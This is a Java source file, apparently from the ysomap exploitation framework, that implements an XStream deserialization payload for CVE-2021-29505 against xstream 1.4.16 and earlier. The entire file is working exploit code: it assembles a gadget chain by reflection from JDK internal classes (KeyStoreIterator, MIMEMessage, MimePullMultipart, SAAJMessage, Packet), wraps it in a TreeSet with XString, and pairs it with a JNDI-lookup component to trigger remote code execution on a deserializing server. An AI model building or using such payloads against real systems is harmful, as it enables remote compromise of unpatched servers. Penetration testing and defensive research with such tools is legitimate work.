package ysomap.payloads.xstream;

import com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart;
import com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl;
import com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage;
import com.sun.xml.internal.org.jvnet.mimepull.MIMEPart;
import com.sun.xml.internal.ws.api.SOAPVersion;
import com.sun.xml.internal.ws.api.message.Message;
import com.sun.xml.internal.ws.api.message.Packet;
import com.sun.xml.internal.ws.message.saaj.SAAJMessage;
import org.w3c.dom.Element;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LazySearchEnumerationImplBullet;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Require;
import ysomap.common.annotation.Targets;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import java.util.ArrayList;

/**
 * CVE-2021-29505
 * @author wh1t3P1g
 * @since 2021/6/1
 */
@Authors({ Authors.WH1T3P1G })
@Targets({ Targets.XSTREAM })
@Dependencies({"<=com.thoughtworks.xstream:xstream:1.4.16"})
@Require(bullets = {"LazySearchEnumerationImplBullet","ContextEnumeratorBullet"}, param = false)
public class XMLMessagePacket extends XStreamPayload<Object> {

    @Override
    public boolean checkObject(Object obj) {
        return true;
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return LazySearchEnumerationImplBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Object it = ReflectionHelper
                .createWithoutConstructor("com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator");
        ReflectionHelper.setFieldValue(it, "aliases", obj);
        MIMEMessage mm = ReflectionHelper.createWithoutConstructor(MIMEMessage.class);
        ReflectionHelper.setFieldValue(mm, "it", it);
        MimePullMultipart multipart = ReflectionHelper.createWithoutConstructor(MimePullMultipart.class);
        ReflectionHelper.setFieldValue(multipart, "mm", mm);
        Object mimePart = ReflectionHelper.createWithoutConstructor(MIMEPart.class);
        ReflectionHelper.setFieldValue(multipart, "soapPart", mimePart);
        Message1_1Impl sm = new Message1_1Impl();
        ReflectionHelper.setFieldValue(sm, "multiPart", multipart);
        ReflectionHelper.setFieldValue(sm, "attachmentsInitialized", false);
        Message msg = new SAAJMessage(sm);
        Packet packet = new Packet();
        packet.setMessage(msg);
        ReflectionHelper.setFieldValue(sm, "headers", null);
        ReflectionHelper.setFieldValue(msg, "messageMetadata", null);
        ReflectionHelper.setFieldValue(msg, "parsedMessage", true);
        ReflectionHelper.setFieldValue(msg, "soapVersion", SOAPVersion.SOAP_11);
        ReflectionHelper.setFieldValue(msg, "bodyParts", new ArrayList<Element>());
        ReflectionHelper.setFieldValue(packet, "satellites", null);
        ReflectionHelper.setFieldValue(packet, "viewthis", null);
        return PayloadHelper.makeTreeSetWithXString(packet);
    }
}
